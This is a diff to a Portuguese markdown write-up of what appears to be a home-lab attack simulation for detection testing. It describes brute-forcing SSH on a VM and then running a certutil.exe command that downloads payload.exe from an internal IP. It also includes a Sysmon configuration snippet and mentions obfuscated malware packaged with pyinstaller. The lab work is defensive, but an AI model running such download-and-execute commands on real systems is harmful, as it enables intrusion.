@@ -203,6 +203,21 @@ pyinstaller malwareobfuscated.spec
 
 ##DELIVERING THE PAYLOAD 
 
+Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o payload
+para realizar a requisicao vamos testar alguns executaveis nativos do windowns para aumentar o nivel de ofucacao
+
+[PRINT HYDRA]
+
+ ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
+
+[PRINT CERTUTIL COMMAND]
+
+[PRINT ANTIVIRUS]
+
+Certutil.exe é uma Living-off-the-Land Binary (LOLBAS) usada por atacantes para baixar cargas maliciosas via HTTP, 
+mas também, como podemos ver pelo output muito monitorada por antivirus modernos. 
+
+
 1. **Objetivo da simulação**
 2. **Comando executado pelo atacante**
 3. **Expectativa (o que deve ser gerado no log)**
@@ -214,6 +229,11 @@ pyinstaller malwareobfuscated.spec
 ### 📁 Sysmon - Configuração
 Trecho da config usada (ou link para ela).
 
+
+
+
+
+
 ```xml
 <!-- Exemplo -->
 <EventFiltering>
@@ -221,3 +241,5 @@ Trecho da config usada (ou link para ela).
     <Image condition="contains">rundll32.exe</Image>
   </ProcessCreate>
 </EventFiltering>
+```
+
